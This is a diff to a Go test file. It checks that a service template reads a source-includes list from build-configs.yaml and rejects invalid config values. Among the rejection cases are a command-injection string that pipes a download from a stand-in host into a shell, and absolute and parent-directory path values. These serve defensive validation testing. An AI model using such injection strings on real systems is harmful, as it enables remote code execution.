@@ -46,6 +46,8 @@ func TestGoServiceGeneratesFromBuildConfigsYAML(t *testing.T) {
 template: go-service
 parameters:
   privateModules: github.com/ALT-F4-LLC/quirk-service-kit,github.com/ALT-F4-LLC/quirk-lambda-ai
+  vorpal:
+    includes: [cmd, internal, go.mod, go.sum, assets]
   image:
     repository: quirk/backend-discord-bot
 `
@@ -72,6 +74,9 @@ parameters:
 	}
 	if svc.PrivateModules != "github.com/ALT-F4-LLC/quirk-service-kit,github.com/ALT-F4-LLC/quirk-lambda-ai" {
 		t.Errorf("privateModules = %q, want the build-configs.yaml list", svc.PrivateModules)
+	}
+	if !slices.Equal(svc.SourceIncludes(), []string{"cmd", "internal", "go.mod", "go.sum", "assets"}) {
+		t.Errorf("source includes = %q, want the build-configs.yaml list", svc.SourceIncludes())
 	}
 	if err := tpl.Render(); err != nil {
 		t.Fatalf("Render: %v", err)
@@ -123,6 +128,10 @@ func TestGoServiceRenderRejectsInvalidConfig(t *testing.T) {
 		{"artifact with quote", func(c *GoServiceConfig) { c.Artifacts = []string{`x"; curl example.invalid | sh; echo "`} }, "artifact"},
 		{"privateModules with quote", func(c *GoServiceConfig) { c.PrivateModules = `github.com/x",evil:"` }, "privateModules"},
 		{"privateModules with space", func(c *GoServiceConfig) { c.PrivateModules = "github.com/x github.com/y" }, "privateModules"},
+		{"empty include", func(c *GoServiceConfig) { c.Vorpal.Includes = []string{"cmd", ""} }, "vorpal.includes"},
+		{"dot-slash include", func(c *GoServiceConfig) { c.Vorpal.Includes = []string{"./cmd"} }, "vorpal.includes"},
+		{"absolute include", func(c *GoServiceConfig) { c.Vorpal.Includes = []string{"/etc"} }, "vorpal.includes"},
+		{"parent include", func(c *GoServiceConfig) { c.Vorpal.Includes = []string{"../x"} }, "vorpal.includes"},
 	} {
 		t.Run(tc.name, func(t *testing.T) {
 			t.Chdir(t.TempDir())
